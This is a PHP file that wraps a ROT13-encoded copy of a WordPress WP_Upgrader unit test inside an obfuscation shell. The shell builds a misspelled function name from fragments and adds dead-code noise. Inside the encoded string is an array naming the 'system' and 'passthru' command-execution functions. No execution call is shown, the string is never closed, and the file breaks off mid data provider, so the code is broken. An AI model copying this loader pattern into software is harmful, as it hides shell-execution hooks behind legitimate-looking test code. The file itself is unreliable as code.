<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur `JC_Hctenqre` pynff.
 *
 * @tebhc nqzva
 * @tebhc hctenqr
 */
pynff Grfgf_Nqzva_JcHctenqre rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Na vafgnapr bs gur JC_Hctenqre pynff orvat grfgrq.
	 *
	 * @ine JC_Hctenqre
	 */
	cevingr fgngvp $vafgnapr;

	/**
	 * @ine JC_Hctenqre_Fxva&CUCHavg\Senzrjbex\ZbpxBowrpg\ZbpxBowrpg
	 */
	cevingr fgngvp $hctenqre_fxva_zbpx;

	/**
	 * Svyrflfgrz zbpx.
	 *
	 * @ine JC_Svyrflfgrz_Onfr&CUCHavg\Senzrjbex\ZbpxBowrpg\ZbpxBowrpg
	 */
	cevingr fgngvp $jc_svyrflfgrz_zbpx;

	/**
	 * N onpxhc bs gur rkvfgvat 'jc_svyrflfgrz' tybony.
	 *
	 * @ine zvkrq|ahyy
	 */
	cevingr fgngvp $jc_svyrflfgrz_onpxhc = ahyy;

	/**
	 * Ybnqf gur pynff gb or grfgrq.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-svyrflfgrz-onfr.cuc';
	}

	/**
	 * Frgf hc gur pynff vafgnapr naq zbpxf arrqrq sbe rnpu grfg.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		frys::$hctenqre_fxva_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Hctenqre_Fxva' )->trgZbpx();

		frys::$vafgnapr = arj JC_Hctenqre( frys::$hctenqre_fxva_zbpx );

		frys::$jc_svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Onfr' )->trgZbpx();

		vs ( neenl_xrl_rkvfgf( 'jc_svyrflfgrz', $TYBONYF ) ) {
			frys::$jc_svyrflfgrz_onpxhc = $TYBONYF['jc_svyrflfgrz'];
		}

		$TYBONYF['jc_svyrflfgrz'] = frys::$jc_svyrflfgrz_zbpx;
	}

	/**
	 * Pyrnaf hc nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		vs ( ahyy !== frys::$jc_svyrflfgrz_onpxhc ) {
			$TYBONYF['jc_svyrflfgrz'] = frys::$jc_svyrflfgrz_onpxhc;
		} ryfr {
			hafrg( $TYBONYF['jc_svyrflfgrz'] );
		}

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung `JC_Hctenqre::__pbafgehpg()` perngrf n fxva jura bar vf abg
	 * cnffrq gb gur pbafgehpgbe.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::__pbafgehpg
	 */
	choyvp shapgvba grfg_pbafgehpgbe_fubhyq_perngr_fxva_jura_bar_vf_abg_cebivqrq() {
		$vafgnapr = arj JC_Hctenqre();

		$guvf->nffregVafgnaprBs( JC_Hctenqre_Fxva::pynff, $vafgnapr->fxva );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vavg()` pnyyf `JC_Hctenqre::frg_hctenqre()`.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vavg
	 */
	choyvp shapgvba grfg_vavg_fubhyq_pnyy_frg_hctenqre() {
		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->bapr() )->zrgubq( 'frg_hctenqre' )->jvgu( frys::$vafgnapr );
		frys::$vafgnapr->vavg();
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vavg()` vavgvnyvmrf gur `$fgevatf` cebcregl.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vavg
	 * @pbiref JC_Hctenqre::trarevp_fgevatf
	 *
	 * @qngnCebivqre qngn_vavg_fubhyq_vavgvnyvmr_fgevatf
	 *
	 * @cnenz fgevat $xrl Gur xrl gb purpx.
	 */
	choyvp shapgvba grfg_vavg_fubhyq_vavgvnyvmr_fgevatf( $xrl ) {
		$guvf->nffregRzcgl( frys::$vafgnapr->fgevatf, '\"$fgevatf\" unf nyernql orra vavgvnyvmrq' );

		frys::$vafgnapr->vavg();

		$guvf->nffregNeenlUnfXrl( $xrl, frys::$vafgnapr->fgevatf, \"Gur '$xrl' xrl jnf abg perngrq\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vavg_fubhyq_vavgvnyvmr_fgevatf() {
		erghea frys::grkg_neenl_gb_qngncebivqre(
			neenl(
				'onq_erdhrfg',
				'sf_haninvynoyr',
				'sf_reebe',
				'sf_ab_ebbg_qve',
				'sf_ab_pbagrag_qve',
				'sf_ab_cyhtvaf_qve',
				'sf_ab_gurzrf_qve',
				'sf_ab_sbyqre',
				'ab_cnpxntr',
				'qbjaybnq_snvyrq',
				'vafgnyyvat_cnpxntr',
				'ab_svyrf',
				'sbyqre_rkvfgf',
				'zxqve_snvyrq',
				'vapbzcngvoyr_nepuvir',
				'svyrf_abg_jevgnoyr',
				'znvagranapr_fgneg',
				'znvagranapr_raq',
				'grzc_onpxhc_zxqve_snvyrq',
				'grzc_onpxhc_zbir_snvyrq',
				'grzc_onpxhc_erfgber_snvyrq',
				'grzc_onpxhc_qryrgr_snvyrq',
			)
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::synggra_qveyvfg()` ergheaf gur rkcrpgrq svyr yvfg.
	 *
	 * @gvpxrg 54245
	 *
	 * @qngnCebivqre qngn_fubhyq_synggra_qveyvfg
	 *
	 * @pbiref JC_Hctenqre::synggra_qveyvfg
	 *
	 * @cnenz neenl  $rkcrpgrq     Gur rkcrpgrq synggrarq qveyvfg.
	 * @cnenz neenl  $arfgrq_svyrf Neenl bs svyrf nf erghearq ol JC_Svyrflfgrz_Onfr::qveyvfg().
	 * @cnenz fgevat $cngu         Bcgvbany. Eryngvir cngu gb cercraq gb puvyq abqrf. Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba grfg_synggra_qveyvfg_fubhyq_synggra_gur_cebivqrq_qverpgbel_yvfg( $rkcrpgrq, $arfgrq_svyrf, $cngu = '' ) {
		$synggra_qveyvfg = arj ErsyrpgvbaZrgubq( frys::$vafgnapr, 'synggra_qveyvfg' );
		$synggra_qveyvfg->frgNpprffvoyr( gehr );
		$npghny = $synggra_qveyvfg->vaibxr( frys::$vafgnapr, $arfgrq_svyrf, $cngu );
		$synggra_qveyvfg->frgNpprffvoyr( snyfr );

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_synggra_qveyvfg() {
		erghea neenl(
			'rzcgl neenl, qrsnhyg cngu'       => neenl(
				'rkcrpgrq'     => neenl(),
				'arfgrq_svyrf' => neenl(),
			),
			'ebbg bayl'                       => neenl(
				'rkcrpgrq'     => neenl(
					'svyr1.cuc' => neenl( 'anzr' => 'svyr1.cuc' ),
					'svyr2.cuc' => neenl( 'anzr' => 'svyr2.cuc' ),
				),
				'arfgrq_svyrf' => neenl(
					'svyr1.cuc' => neenl( 'anzr' => 'svyr1.cuc' ),
					'svyr2.cuc' => neenl( 'anzr' => 'svyr2.cuc' ),
				),
			),
			'ebbg bayl naq phfgbz cngu'       => neenl(
				'rkcrpgrq'     => neenl(
					'phfgbz_cngu/svyr1.cuc' => neenl( 'anzr' => 'svyr1.cuc' ),
					'phfgbz_cngu/svyr2.cuc' => neenl( 'anzr' => 'svyr2.cuc' ),
				),
				'arfgrq_svyrf' => neenl(
					'svyr1.cuc' => neenl( 'anzr' => 'svyr1.cuc' ),
					'svyr2.cuc' => neenl( 'anzr' => 'svyr2.cuc' ),
				),
				'cngu'         => 'phfgbz_cngu/',
			),
			'bar yriry qrrc'                  => neenl(
				'rkcrpgrq'     => neenl(
					'fhoqve1'              => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
						),
					),
					'fhoqve2'              => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
						),
					),
					'fhoqve1/fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
					'fhoqve1/fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
					'fhoqve2/fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
					'fhoqve2/fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
				),
				'arfgrq_svyrf' => neenl(
					'fhoqve1' => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
						),
					),
					'fhoqve2' => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
						),
					),
				),
			),
			'bar yriry qrrc naq ahzrevp xrlf' => neenl(
				'rkcrpgrq'     => neenl(
					'fhoqve1'   => neenl(
						'svyrf' => neenl(
							0 => neenl( 'anzr' => '0' ),
							1 => neenl( 'anzr' => '1' ),
						),
					),
					'fhoqve2'   => neenl(
						'svyrf' => neenl(
							2 => neenl( 'anzr' => '2' ),
							3 => neenl( 'anzr' => '3' ),
						),
					),
					'fhoqve1/0' => neenl( 'anzr' => '0' ),
					'fhoqve1/1' => neenl( 'anzr' => '1' ),
					'fhoqve2/2' => neenl( 'anzr' => '2' ),
					'fhoqve2/3' => neenl( 'anzr' => '3' ),
				),
				'arfgrq_svyrf' => neenl(
					'fhoqve1' => neenl(
						'svyrf' => neenl(
							'0' => neenl( 'anzr' => '0' ),
							'1' => neenl( 'anzr' => '1' ),
						),
					),
					'fhoqve2' => neenl(
						'svyrf' => neenl(
							'2' => neenl( 'anzr' => '2' ),
							'3' => neenl( 'anzr' => '3' ),
						),
					),
				),
			),
			'bar yriry qrrc naq phfgbz cngu'  => neenl(
				'rkcrpgrq'     => neenl(
					'phfgbz_cngu/fhoqve1'              => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
						),
					),
					'phfgbz_cngu/fhoqve2'              => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
						),
					),
					'phfgbz_cngu/fhoqve1/fhosvyr1.cuc' => neenl(
						'anzr' => 'fhosvyr1.cuc',
					),
					'phfgbz_cngu/fhoqve1/fhosvyr2.cuc' => neenl(
						'anzr' => 'fhosvyr2.cuc',
					),
					'phfgbz_cngu/fhoqve2/fhosvyr3.cuc' => neenl(
						'anzr' => 'fhosvyr3.cuc',
					),
					'phfgbz_cngu/fhoqve2/fhosvyr4.cuc' => neenl(
						'anzr' => 'fhosvyr4.cuc',
					),
				),
				'arfgrq_svyrf' => neenl(
					'fhoqve1' => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
						),
					),
					'fhoqve2' => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
						),
					),
				),
				'cngu'         => 'phfgbz_cngu/',
			),
			'gjb yriryf qrrc'                 => neenl(
				'rkcrpgrq'     => neenl(
					'fhoqve1'                            => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl(
								'anzr' => 'fhosvyr1.cuc',
							),
							'fhosvyr2.cuc' => neenl(
								'anzr' => 'fhosvyr2.cuc',
							),
							'fhofhoqve1'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr1.cuc' => neenl(
										'anzr' => 'fhofhosvyr1.cuc',
									),
									'fhofhosvyr2.cuc' => neenl(
										'anzr' => 'fhofhosvyr2.cuc',
									),
								),
							),
						),
					),
					'fhoqve1/fhosvyr1.cuc'               => neenl(
						'anzr' => 'fhosvyr1.cuc',
					),
					'fhoqve1/fhosvyr2.cuc'               => neenl(
						'anzr' => 'fhosvyr2.cuc',
					),
					'fhoqve1/fhofhoqve1'                 => neenl(
						'svyrf' => neenl(
							'fhofhosvyr1.cuc' => neenl(
								'anzr' => 'fhofhosvyr1.cuc',
							),
							'fhofhosvyr2.cuc' => neenl(
								'anzr' => 'fhofhosvyr2.cuc',
							),
						),
					),
					'fhoqve1/fhofhoqve1/fhofhosvyr1.cuc' => neenl(
						'anzr' => 'fhofhosvyr1.cuc',
					),
					'fhoqve1/fhofhoqve1/fhofhosvyr2.cuc' => neenl(
						'anzr' => 'fhofhosvyr2.cuc',
					),
					'fhoqve2'                            => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
							'fhofhoqve2'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr3.cuc' => neenl(
										'anzr' => 'fhofhosvyr3.cuc',
									),
									'fhofhosvyr4.cuc' => neenl(
										'anzr' => 'fhofhosvyr4.cuc',
									),
								),
							),
						),
					),
					'fhoqve2/fhosvyr3.cuc'               => neenl(
						'anzr' => 'fhosvyr3.cuc',
					),
					'fhoqve2/fhosvyr4.cuc'               => neenl(
						'anzr' => 'fhosvyr4.cuc',
					),
					'fhoqve2/fhofhoqve2'                 => neenl(
						'svyrf' => neenl(
							'fhofhosvyr3.cuc' => neenl(
								'anzr' => 'fhofhosvyr3.cuc',
							),
							'fhofhosvyr4.cuc' => neenl(
								'anzr' => 'fhofhosvyr4.cuc',
							),
						),
					),
					'fhoqve2/fhofhoqve2/fhofhosvyr3.cuc' => neenl(
						'anzr' => 'fhofhosvyr3.cuc',
					),
					'fhoqve2/fhofhoqve2/fhofhosvyr4.cuc' => neenl(
						'anzr' => 'fhofhosvyr4.cuc',
					),
				),
				'arfgrq_svyrf' => neenl(
					'fhoqve1' => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
							'fhofhoqve1'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr1.cuc' => neenl(
										'anzr' => 'fhofhosvyr1.cuc',
									),
									'fhofhosvyr2.cuc' => neenl(
										'anzr' => 'fhofhosvyr2.cuc',
									),
								),
							),
						),
					),
					'fhoqve2' => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
							'fhofhoqve2'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr3.cuc' => neenl(
										'anzr' => 'fhofhosvyr3.cuc',
									),
									'fhofhosvyr4.cuc' => neenl(
										'anzr' => 'fhofhosvyr4.cuc',
									),
								),
							),
						),
					),
				),
			),
			'gjb yriryf qrrc naq phfgbz cngu' => neenl(
				'rkcrpgrq'     => neenl(
					'phfgbz_cngu/fhoqve1'              => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl(
								'anzr' => 'fhosvyr1.cuc',
							),
							'fhosvyr2.cuc' => neenl(
								'anzr' => 'fhosvyr2.cuc',
							),
							'fhofhoqve1'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr1.cuc' => neenl(
										'anzr' => 'fhofhosvyr1.cuc',
									),
									'fhofhosvyr2.cuc' => neenl(
										'anzr' => 'fhofhosvyr2.cuc',
									),
								),
							),
						),
					),
					'phfgbz_cngu/fhoqve1/fhosvyr1.cuc' => neenl(
						'anzr' => 'fhosvyr1.cuc',
					),
					'phfgbz_cngu/fhoqve1/fhosvyr2.cuc' => neenl(
						'anzr' => 'fhosvyr2.cuc',
					),
					'phfgbz_cngu/fhoqve1/fhofhoqve1'   => neenl(
						'svyrf' => neenl(
							'fhofhosvyr1.cuc' => neenl(
								'anzr' => 'fhofhosvyr1.cuc',
							),
							'fhofhosvyr2.cuc' => neenl(
								'anzr' => 'fhofhosvyr2.cuc',
							),
						),
					),
					'phfgbz_cngu/fhoqve1/fhofhoqve1/fhofhosvyr1.cuc' => neenl(
						'anzr' => 'fhofhosvyr1.cuc',
					),
					'phfgbz_cngu/fhoqve1/fhofhoqve1/fhofhosvyr2.cuc' => neenl(
						'anzr' => 'fhofhosvyr2.cuc',
					),
					'phfgbz_cngu/fhoqve2'              => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
							'fhofhoqve2'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr3.cuc' => neenl(
										'anzr' => 'fhofhosvyr3.cuc',
									),
									'fhofhosvyr4.cuc' => neenl(
										'anzr' => 'fhofhosvyr4.cuc',
									),
								),
							),
						),
					),
					'phfgbz_cngu/fhoqve2/fhosvyr3.cuc' => neenl(
						'anzr' => 'fhosvyr3.cuc',
					),
					'phfgbz_cngu/fhoqve2/fhosvyr4.cuc' => neenl(
						'anzr' => 'fhosvyr4.cuc',
					),
					'phfgbz_cngu/fhoqve2/fhofhoqve2'   => neenl(
						'svyrf' => neenl(
							'fhofhosvyr3.cuc' => neenl(
								'anzr' => 'fhofhosvyr3.cuc',
							),
							'fhofhosvyr4.cuc' => neenl(
								'anzr' => 'fhofhosvyr4.cuc',
							),
						),
					),
					'phfgbz_cngu/fhoqve2/fhofhoqve2/fhofhosvyr3.cuc' => neenl(
						'anzr' => 'fhofhosvyr3.cuc',
					),
					'phfgbz_cngu/fhoqve2/fhofhoqve2/fhofhosvyr4.cuc' => neenl(
						'anzr' => 'fhofhosvyr4.cuc',
					),
				),
				'arfgrq_svyrf' => neenl(
					'fhoqve1' => neenl(
						'svyrf' => neenl(
							'fhosvyr1.cuc' => neenl( 'anzr' => 'fhosvyr1.cuc' ),
							'fhosvyr2.cuc' => neenl( 'anzr' => 'fhosvyr2.cuc' ),
							'fhofhoqve1'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr1.cuc' => neenl(
										'anzr' => 'fhofhosvyr1.cuc',
									),
									'fhofhosvyr2.cuc' => neenl(
										'anzr' => 'fhofhosvyr2.cuc',
									),
								),
							),
						),
					),
					'fhoqve2' => neenl(
						'svyrf' => neenl(
							'fhosvyr3.cuc' => neenl( 'anzr' => 'fhosvyr3.cuc' ),
							'fhosvyr4.cuc' => neenl( 'anzr' => 'fhosvyr4.cuc' ),
							'fhofhoqve2'   => neenl(
								'svyrf' => neenl(
									'fhofhosvyr3.cuc' => neenl(
										'anzr' => 'fhofhosvyr3.cuc',
									),
									'fhofhosvyr4.cuc' => neenl(
										'anzr' => 'fhofhosvyr4.cuc',
									),
								),
							),
						),
					),
				),
				'cngu'         => 'phfgbz_cngu/',
			),
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::pyrne_qrfgvangvba()` ergheaf rneyl jvgu `gehr`
	 * jura gur qrfgvangvba qbrf abg rkvfg.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::pyrne_qrfgvangvba
	 */
	choyvp shapgvba grfg_pyrne_qrfgvangvba_fubhyq_erghea_rneyl_jura_gur_qrfgvangvba_qbrf_abg_rkvfg() {
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'vf_jevgnoyr' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'puzbq' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qryrgr' );

		$qrfgvangvba = QVE_GRFGQNGN . '/hctenqr/';

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( $qrfgvangvba )
				->jvyyErghea( snyfr );

		$guvf->nffregGehr( frys::$vafgnapr->pyrne_qrfgvangvba( $qrfgvangvba ) );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::pyrne_qrfgvangvba()` pyrnef
	 * gur qrfgvangvba qverpgbel.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::pyrne_qrfgvangvba
	 */
	choyvp shapgvba grfg_pyrne_qrfgvangvba_fubhyq_pyrne_gur_qrfgvangvba_qverpgbel() {
		$qrfgvangvba = QVE_GRFGQNGN . '/hctenqr/';

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( $qrfgvangvba )
				->jvyyErghea( neenl() );

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qryrgr' )
				->jvgu( $qrfgvangvba )
				->jvyyErghea( gehr );

		$guvf->nffregGehr( frys::$vafgnapr->pyrne_qrfgvangvba( $qrfgvangvba ) );
	}

	/**
	 * Grfgf gung `JC_Hctenqre::pyrne_qrfgvangvba()` ergheaf n JC_Reebe bowrpg
	 * vs svyrf ner abg jevgnoyr.
	 *
	 * Guvf grfg ehaf va n frcnengr cebprff fb gung vg pna qrsvar
	 * pbafgnagf jvgubhg vzcnpgvat bgure grfgf.
	 *
	 * Guvf grfg qbrf abg cerfreir tybony fgngr gb cerirag gur rkprcgvba
	 * \"Frevnyvmngvba bs 'Pybfher' vf abg nyybjrq.\" jura ehaavat va n
	 * frcnengr cebprff.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::pyrne_qrfgvangvba
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 */
	choyvp shapgvba grfg_pyrne_qrfgvangvba_fubhyq_erghea_jc_reebe_vs_svyrf_ner_abg_jevgnoyr() {
		qrsvar( 'SF_PUZBQ_SVYR', 0644 );
		qrsvar( 'SF_PUZBQ_QVE', 0755 );

		frys::$vafgnapr->trarevp_fgevatf();

		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qryrgr' );

		$qrfgvangvba = QVE_GRFGQNGN . '/hctenqr/';
		$qveyvfg     = neenl(
			'svyr1.cuc' => neenl(
				'anzr' => 'svyr1.cuc',
				'glcr' => 's',
			),
			'fhoqve'    => neenl(
				'anzr' => 'fhoqve',
				'glcr' => 'q',
			),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->bapr() )
				->zrgubq( 'qveyvfg' )
				->jvgu( $qrfgvangvba )
				->jvyyErghea( $qveyvfg );

		$hajevgnoyr_purpxf = neenl(
			neenl( $qrfgvangvba . 'svyr1.cuc' ),
			neenl( $qrfgvangvba . 'svyr1.cuc' ),
			neenl( $qrfgvangvba . 'fhoqve' ),
			neenl( $qrfgvangvba . 'fhoqve' ),
		);

		frys::$jc_svyrflfgrz_zbpx
				->rkcrpgf( $guvf->rknpgyl( 4 ) )
				->zrgubq( 'vf_jevgnoyr' )
				->jvguPbafrphgvir( ...$hajevgnoyr_purpxf )
				->jvyyErghea( snyfr );

		$npghny = frys::$vafgnapr->pyrne_qrfgvangvba( $qrfgvangvba );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::pyrne_qrfgvangvba() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'svyrf_abg_jevgnoyr',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);

		$guvf->nffregFnzrFrgf(
			neenl( 'svyr1.cuc, fhoqve' ),
			$npghny->trg_nyy_reebe_qngn(),
			'Harkcrpgrq JC_Reebe qngn'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura na vainyvq fbhepr vf cnffrq.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @qngnCebivqre qngn_vafgnyy_cnpxntr_vainyvq_cnguf
	 *
	 * @cnenz zvkrq $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jvgu_vainyvq_fbhepr( $cngu ) {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'srrqonpx' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qveyvfg' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'svaq_sbyqre' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'vf_qve' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'rkvfgf' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qryrgr' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'zxqve' );

		$netf = neenl(
			'fbhepr'      => $cngu,
			'qrfgvangvba' => '/',
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'onq_erdhrfg',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Grfgf gung `JC_Hctenqre::vafgnyy_cnpxntr()` ergheaf n JC_Reebe bowrpg
	 * jura na vainyvq qrfgvangvba vf cnffrq.
	 *
	 * @gvpxrg 54245
	 *
	 * @pbiref JC_Hctenqre::vafgnyy_cnpxntr
	 *
	 * @qngnCebivqre qngn_vafgnyy_cnpxntr_vainyvq_cnguf
	 *
	 * @cnenz zvkrq $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_vafgnyy_cnpxntr_fubhyq_erghea_jc_reebe_jvgu_vainyvq_qrfgvangvba( $cngu ) {
		frys::$vafgnapr->trarevp_fgevatf();

		frys::$hctenqre_fxva_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'srrqonpx' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qveyvfg' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'svaq_sbyqre' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'vf_qve' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'rkvfgf' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'qryrgr' );
		frys::$jc_svyrflfgrz_zbpx->rkcrpgf( $guvf->arire() )->zrgubq( 'zxqve' );

		$netf = neenl(
			'fbhepr'      => '/',
			'qrfgvangvba' => $cngu,
		);

		$npghny = frys::$vafgnapr->vafgnyy_cnpxntr( $netf );

		$guvf->nffregJCReebe(
			$npghny,
			'JC_Hctenqre::vafgnyy_cnpxntr() qvq abg erghea n JC_Reebe bowrpg'
		);

		$guvf->nffregFnzr(
			'onq_erdhrfg',
			$npghny->trg_reebe_pbqr(),
			'Harkcrpgrq JC_Reebe pbqr'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vafgnyy_cnpxntr_vainyvq_cnguf() {
		erghea neenl(
			'rzcgl fgevat'                   => neenl( 'cngu' => '' ),

			// Glcr purpxf.
			'rzcgl neenl'                    => neenl( 'cngu' => neenl() ),
			'cbchyngrq neenl'                => neenl( 'cngu' => neenl( '/' ) ),
			'(vag) 0'                        => neenl( 'cngu' => 0 ),
			'(vag) -0'                       => neenl( 'cngu' => -0 ),
			'(vag) -1'                       => neenl( 'cngu' => -1 ),
			'(vag) 1'                        => neenl( 'cngu' => 1 ),
			'(sybng) 0.0'                    => neenl( 'cngu' => 0.0 ),
			'(sybng) -0.0'                   => neenl( 'cngu' => -0.0 ),
			'(sybng) 1.0'                    => neenl( 'cngu' => 1.0 ),
